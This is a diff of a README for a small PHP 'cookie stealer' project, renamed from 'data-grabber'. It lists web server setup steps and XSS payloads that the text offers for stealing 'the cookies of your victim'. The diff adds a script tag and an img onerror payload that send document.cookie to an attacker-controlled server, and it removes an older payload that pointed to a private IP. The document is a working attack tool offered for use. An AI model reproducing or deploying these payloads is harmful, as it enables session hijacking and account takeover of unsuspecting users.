@@ -1,8 +1,8 @@
-# data-grabber
-web data grabber in PHP
+# cookie-stealer
+simple cookie stealer in PHP
 
 ## usage
-#### step1 - start web server on your own web server
+#### step1 - start web server on your web server
 ```
 sudo apt update && apt upgrade -y
 sudo apt install apache2
@@ -26,7 +26,8 @@ http://192.168.1.135/p1.php?txt=your-data
 #### Payload
 here is some payload for vulnerabilities like XSS to steal the cookies of your victim:
 ```
-<script>window.location="http://192.168.1.135/wdata-grabber/p1.php?txt="+document.cookie</script>
+<script>window.location="http://your-server-ip-or-domain/cookie-stealer/p1.php?txt="+document.cookie</script>
+<img src=/ onerror=window.location="http://your-server-ip-or-domain/cookie-stealer/p1.php?txt="+document.cookie></img>
 ```
 
 ### p1.php
